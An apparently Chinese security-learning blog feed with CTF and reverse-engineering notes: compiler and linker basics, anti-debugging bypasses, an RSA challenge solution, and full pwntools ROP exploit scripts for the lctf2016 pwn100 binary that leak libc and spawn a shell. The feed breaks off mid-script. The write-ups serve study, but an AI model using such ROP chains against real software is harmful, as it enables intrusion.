<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment" spellcheck="true">//创建失败</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// 新任务</span>
    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> command<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment" spellcheck="true">// 这里是原任务, pid 是新任务的pid</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>是不是有点迷之奇怪…<br>fork调用后<br>本任务的fork会返回新任务的pid<br>新任务的fork会返回0<br>所以使用fork和exec新建进程其实就是这个样子写的…</p>
<h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><p>多线程对于可共享的变量的读写可能导致数据的不一致性</p>
<ol>
<li>使用操作系统提供的原子操作</li>
<li>使用锁</li>
<li>使用可重入的函数</li>
</ol>
<h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>这个..其实面试的时候被问到了这个问题,我不会,惨…<br>这个关键字是为shi了tu阻止过度优化而造成的线程安全问题<br>具体可以做到</p>
<ul>
<li>阻止编译器为了提高速度将一个变量缓存到寄存器而不写回</li>
<li>阻止编译器调整操作volatile变量的指令顺序</li>
</ul>
<p>但即使volatile能阻止编译器调整顺序,也不能够阻止CPU动态调度,所以不能完全解决这个由于优化导致的线程安全问题</p>
<h2 id="第二章-静态链接"><a href="#第二章-静态链接" class="headerlink" title="第二章 静态链接"></a>第二章 静态链接</h2><p>四步走</p>
<blockquote>
<p>gcc其实是包装了预编译器cc1, 汇编器as, 链接器ld这些,根据参数不同调用不同的程序</p>
</blockquote>
<ol>
<li><p>预编译(Prepressing)</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$gcc</span> -E hello.c -o hello.i
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$cpp</span> hello.c <span class="token operator">></span> hello.i
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>展开宏定义和处理其他以<code>#</code>开头的预编译指令<br>但保留<code>#pragma</code>, 因为在编译时候还要用到</p>
</li>
<li><p>编译(Compliation)<br>结果一堆复杂的分析(语法,词法,语义…)产生汇编代码</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$gcc</span> -S hello.i -o hello.S
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$gcc</span> -S hello.c -o hello.S
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>汇编(Assembly)<br>汇编代码转化为机器代码, 这个步骤比较简单</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$gcc</span> -c hello.S -o hello.o
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>产生了目标文件<br>也可以从源文件直接过来</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$gcc</span> -c hello.c -o hello.o
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>链接(Linking)</p>
<blockquote>
<p>为什么不由汇编直接输出可执行文件而是输出一个目标文件<br>目标代码中有变量定义在其他模块,这些变量的地址在编译期间不能确定的</p>
</blockquote>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[RE入门]]></title>
      <url>/2017/08/02/RE%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>学习计划</p>
<h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p><a href="http://bbs.pediy.com/thread-20366.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-20366.htm</a><br>这个看了还是一头雾水…在网上down了一份pdf,叫做脱壳的艺术,正在读(百度随便搜)</p>
<h2 id="反静态-反调试-壳"><a href="#反静态-反调试-壳" class="headerlink" title="反静态 反调试 壳"></a>反静态 反调试 壳</h2><p><a href="http://bbs.pediy.com/thread-66575.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-66575.htm</a><br>这个很不错,感觉,讲的,emmmmm,开心</p>
<p>如果<code>反静态 + 反调试 + 壳</code>, 这个时候不能脱壳的话,岂不是GG了, 如果能脱壳,应该就能把反调试patch掉吧,之后动态调试…<br>其实壳好多就算是反静态的吧, 脱壳并且dump就能对抗反静态是这个意思吗</p>
<h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p><a href="http://blog.csdn.net/yangbostar/article/details/6194159" target="_blank" rel="external">http://blog.csdn.net/yangbostar/article/details/6194159</a><br>这个作者有一系列文章, 比如病毒编写<br>花指令思想:<br>把垃圾数据填充在不会执行到的地方…如何保证这些地方不被执行<br>作者提到</p>
<ol>
<li>通过jz + jnz 这样子的来替代jmp</li>
<li>利用某些运算(如xor..)间接控制标志位 + 条件跳转</li>
<li>利用API函数操作返回特定返回值</li>
</ol>
<p>在没有找到相关的文章,暂时就这样子</p>
<h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><p><a href="http://zke1ev3n.me/2015/12/15/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/" target="_blank" rel="external">http://zke1ev3n.me/2015/12/15/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/</a></p>
<p><em>具体还自己看程序员的自我修养</em> 很重要待办事项</p>
<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p><a href="http://www.freebuf.com/sectool/83509.html" target="_blank" rel="external">http://www.freebuf.com/sectool/83509.html</a><br>这一篇,赞,棒</p>
<ol>
<li><p>开始就讲到<code>ptrace</code>反调试,想起来上次HBCTF也有这样子一个题目,要patch掉<code>ptrace</code></p>
</li>
<li><p>之后讲到如果是<code>gdb &lt;TARGET&gt;</code>的时候可以检测父进程名称</p>
</li>
<li><p>如果是<code>attach</code>方式, 可以检查<code>TracerPid</code></p>
</li>
<li><p>alarm定时,这个我确实在CTF里遇到…当时不知道怎么办…,定时很短时间,到时间就退出,原问提到可以通过<code>设置gdb对signal的处理方式</code>来bypass.</p>
</li>
</ol>
<pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> i handle SIGALRM <span class="token comment" spellcheck="true">// 查看SIGALRM信号处理方式</span>
Signal        Stop    Print    Pass to program        Description
SIGALRM       No    Yes        Yes                    Alarm <span class="token function">clock</span>

<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> handle SIGALRM nopass <span class="token comment" spellcheck="true">// 设置不传递</span>
Signal        Stop    Print    Pass to program        Description
SIGALRM       No    Yes        No                    Alarm clock
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>参考 <a href="http://www.cppblog.com/fwxjj/archive/2011/12/06/161621.html" target="_blank" rel="external">http://www.cppblog.com/fwxjj/archive/2011/12/06/161621.html</a></p>
<h2 id="objdump-amp-readelf"><a href="#objdump-amp-readelf" class="headerlink" title="objdump &amp; readelf"></a>objdump &amp; readelf</h2><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><p>readelf 主要是看一些相关信息, 报名哟反汇编的功能, 常用的就是<code>-S</code></p>
<pre class="line-numbers language-shell"><code class="language-shell">readelf -h filename elf头部,主要是好看
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-shell"><code class="language-shell">readelf -S filename 主要是看某一段(sections)的偏移和权限
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-shell"><code class="language-shell">readelf -l filename 主要是看某一节(segments)的信息
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个<code>sections</code>和<code>segments</code>,emmmmmm~,是传说中的链接视图和执行视图里的概念</p>
<p>通常,在ELF在加载到内存里时候,系统会将权限相同的Sections合并成一个Segments</p>
<h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>我用这个objdump主要用来看汇编代码</p>
<pre class="line-numbers language-shell"><code class="language-shell">objdump -d pwn100 反汇编
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果当时编译的时候用了<code>-g</code>,这个时候就能更详细的显示反汇编(掺杂源代码)</p>
<pre class="line-numbers language-shell"><code class="language-shell">objdump -S [-l] pwn100
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个时候加上<code>-l</code>还能把原来行号显示出来</p>
<p><code>-j .text</code> 可以只反汇编指定的<code>section</code></p>
<p>另外记得加上这个…<code>-M intel</code>,默认是AT&amp;T的..看的我</p>
<p>最后一点</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token operator">-</span>d<span class="token punctuation">,</span> <span class="token operator">--</span>disassemble        Display assembler contents of executable sections
<span class="token operator">-</span>D<span class="token punctuation">,</span> <span class="token operator">--</span>disassemble<span class="token operator">-</span>all    Display assembler contents of all sections
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>另外,<code>objdump -h</code>查看ELF的各个段(Sections)的时候,只是把关键的段显示出来了,而忽略了其他辅助的段,要查看所有的段,就要用<code>readelf -S</code></p>
<p>段(Sections)的名字对于编译器,链接器是有意义的,对于操作系统其实只是段的属性和权限有用</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[python 进制 字符]]></title>
      <url>/2017/07/29/python-%E8%BF%9B%E5%88%B6-%E5%AD%97%E7%AC%A6/</url>
      <content type="html"><![CDATA[<p>发现自己不会py里的这些十六进制,ascii转换什么的好尴尬</p>
<p>这样子..拿到了hbctf的一道题目,做到这一步,得到一个字符串</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token number">6E3A37333036393838363737313632353634323830373433353738333636313031343036323630343236343736383438313733353134353837333530383834363932353733353532313639353135390A653A36353533370A633A3135313136373137373034353031363233303238393033393138313331353035353130353830353939353631333537333837343331323935323839303132313933393830353534303132383131</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后要把每两位看成<code>字符的ascii的十六进制形式的话</code>,把这串字符串转换成<code>原来的字符的话</code></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
n<span class="token punctuation">:</span><span class="token number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span>
e<span class="token punctuation">:</span><span class="token number">65537</span>
c<span class="token punctuation">:</span><span class="token number">15116717704501623028903918131505510580599561357387431295289012193980554012811</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里是一个RSA,这里的c是密文,e是公钥<br>这里要把n分解可以得到p * q<br>上这个网站 <a href="http://factordb.com/index.php" target="_blank" rel="external">http://factordb.com/index.php</a> ,分解一下得到两个因子</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> p <span class="token operator">=</span> <span class="token number">189239861511125143212536989589123569301</span>
<span class="token operator">>></span><span class="token operator">></span> q <span class="token operator">=</span> <span class="token number">386123125371923651191219869811293586459</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>RSA 的常见攻击方法看这一篇 <a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3058.html</a><br>这个时候由公钥<code>e</code>和<code>p</code>,<code>q</code>可以解出来私钥<code>d</code></p>
<pre class="line-numbers language-python"><code class="language-python">d <span class="token operator">=</span>  <span class="token number">30854876581442056228588093398155288897790570329196285069001545119486056472273</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有个私钥d, 明文c和模数n就能得到最后的密文m</p>
<pre class="line-numbers language-python"><code class="language-python">m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> m
<span class="token number">630199562897691744494569524488740813666979952696</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这个m这次看起来是个十进制<br>把它变成16进制</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token string">'0x6e63203131392e32382e31352e33342038383838'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还原成字符,要把前面的0x去掉</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
<span class="token string">'nc 119.28.15.34 8888'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>就这样子..感觉是不是有些地方有点笨<br>大佬说可以用<code>libnum</code>,emmmmmmmmm<br>试了下果然可以,十进制也能直接变过来</p>
<pre><code>&gt;&gt;&gt; import libnum
&gt;&gt;&gt; libnum.n2s(m)
&#39;nc 119.28.15.34 8888&#39;
</code></pre><p>前面的decode,encode操作对象是字符串,,,而且不带<code>0x</code><br>后面这个操作对象是数字</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[padding oracle学习]]></title>
      <url>/2017/07/28/padding-oracle%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="https://www.secpulse.com/archives/3537.html" target="_blank" rel="external">https://www.secpulse.com/archives/3537.html</a><br><a href="https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html" target="_blank" rel="external">https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html</a><br><a href="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" target="_blank" rel="external">http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html</a></p>
<p><a href="http://www.vuln.cn/6109" target="_blank" rel="external">http://www.vuln.cn/6109</a><br><a href="http://www.vuln.cn/6716" target="_blank" rel="external">http://www.vuln.cn/6716</a><br><a href="http://www.vuln.cn/6500" target="_blank" rel="external">http://www.vuln.cn/6500</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[off-by-one学习]]></title>
      <url>/2017/07/28/off-by-one%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/</a><br><a href="https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/</a><br><a href="http://bobao.360.cn/learning/detail/3113.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3113.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[double free学习]]></title>
      <url>/2017/07/28/double-free%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/6172" target="_blank" rel="external">http://www.vuln.cn/6172</a><br>这篇作者<code>explorer</code>的blog原文<br><a href="http://libc.pw/2015/08/24/Double%20Free%E6%B5%85%E6%9E%90/" target="_blank" rel="external">http://libc.pw/2015/08/24/Double%20Free%E6%B5%85%E6%9E%90/</a></p>
<p><a href="http://www.cnblogs.com/0xJDchen/p/6195919.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6195919.html</a><br><a href="http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up" target="_blank" rel="external">http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up</a></p>
<h2 id="关于Free"><a href="#关于Free" class="headerlink" title="关于Free"></a>关于Free</h2><p>在Free的时候到底是检查哪些内容?<br>看<a href="">malloc.c</a>源码….天哦<br>是fastbins和其他bin的free时候检查不太一样</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[UAF学习]]></title>
      <url>/2017/07/28/UAF%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/6275" target="_blank" rel="external">http://www.vuln.cn/6275</a><br><a href="https://sploitfun.wordpress.com/2015/06/16/use-after-free/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/06/16/use-after-free/</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[libc-database]]></title>
      <url>/2017/07/27/libc-database/</url>
      <content type="html"><![CDATA[<p>gitHub上的一个工具</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>介绍里说道这个随机化,通常是最后12bits不变化</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>gitHub上有,git下来之后,先跑一个get,然后慢慢等</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>lctf2016 pwn100<br>一道平常的栈溢出,格式大概是<code>&#39;A&#39; * 0x40 + &#39;A&#39; * 0x8 + ret</code><br>payload基本是从别人wp里改的</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn100'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># p = remote('127.0.0.1', 2332)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn100'</span><span class="token punctuation">)</span>

puts_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
read_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>

puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
read_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>

rsp <span class="token operator">=</span> <span class="token number">0x00601300</span>

<span class="token comment" spellcheck="true"># ROPgadget --binary pwn100 --only "pop|ret"</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400763</span>
pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x0000000000400595</span>
pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400761</span>
pop_pop_pop_pop_ret_addr <span class="token operator">=</span> <span class="token number">0x000000000040075d</span>

payload  <span class="token operator">=</span> <span class="token string">''</span>
<span class="token comment" spellcheck="true"># leak glibc_puts</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># </span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_pop_pop_pop_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>

raw_input<span class="token punctuation">(</span><span class="token string">'go?'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
libc_read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base_addr <span class="token operator">=</span> libc_read_addr <span class="token operator">-</span> <span class="token number">0x00000000000f6670</span>
libc_system_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x0000000000045390</span>
bin_sh_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x18c177</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc_read_addr:%s'</span> <span class="token operator">%</span> hex<span class="token punctuation">(</span>libc_read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload2  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们先是leak出来了libc_read的地址,比方说我这里是<code>0x7fddbd085670</code><br>我使用<code>./find read 670</code>就从database里得到一个id<br>也可以多个条件~<code>./find printf 260 puts f30</code>,条件多一些会准确.,,<br>然后<code>./dump id</code>,我就得到了</p>
<pre class="line-numbers language-c"><code class="language-c">offset___libc_start_main_ret <span class="token operator">=</span> <span class="token number">0x20830</span>
offset_system <span class="token operator">=</span> <span class="token number">0x0000000000045390</span>
offset_dup2 <span class="token operator">=</span> <span class="token number">0x00000000000f6d90</span>
offset_read <span class="token operator">=</span> <span class="token number">0x00000000000f6670</span>
offset_write <span class="token operator">=</span> <span class="token number">0x00000000000f66d0</span>
offset_str_bin_sh <span class="token operator">=</span> <span class="token number">0x18c177</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>照着把这些填进去,就写好了payload</p>
<pre class="line-numbers language-python"><code class="language-python">libc_base_addr <span class="token operator">=</span> libc_read_addr <span class="token operator">-</span> <span class="token number">0x00000000000f6670</span>
libc_system_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x0000000000045390</span>
bin_sh_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x18c177</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>教训..有些人这样做出来的pwn,写完的wp…是一般不能直接拷过来跑的,因为你的libc和人家的不一样</p>
</blockquote>
<p>这里有一点感觉有点巧….<br>这里的payload1有</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># read(0, 0x00601300, 1)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># rsp &lt;- 0x00601300, 后续pop,pop,pop,ret</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_pop_pop_pop_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>先在<code>0x00601300</code>这里铺好了payload2<br>第一个<code>pop rsp</code> 改变了栈顶到<code>0x00601300</code>, 还剩下三个pop出了3个1,然后….<br>这个时候栈顶到了</p>
<pre class="line-numbers language-python"><code class="language-python">payload2  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_system_addr<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后起来shell</p>
<p>我写的话,大概会是再次返回vuln_function….原作者的写法太奇了….我还是比较菜到怀疑人生</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn100'</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn100'</span><span class="token punctuation">)</span>

puts_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
read_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>

puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
read_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>

vuln_function <span class="token operator">=</span> <span class="token number">0x40068E</span>

<span class="token comment" spellcheck="true"># ROPgadget --binary pwn100 --only "pop|ret"</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400763</span>
pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x0000000000400595</span>
pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400761</span>
pop_pop_pop_pop_ret_addr <span class="token operator">=</span> <span class="token number">0x000000000040075d</span>


payload  <span class="token operator">=</span> <span class="token string">''</span>
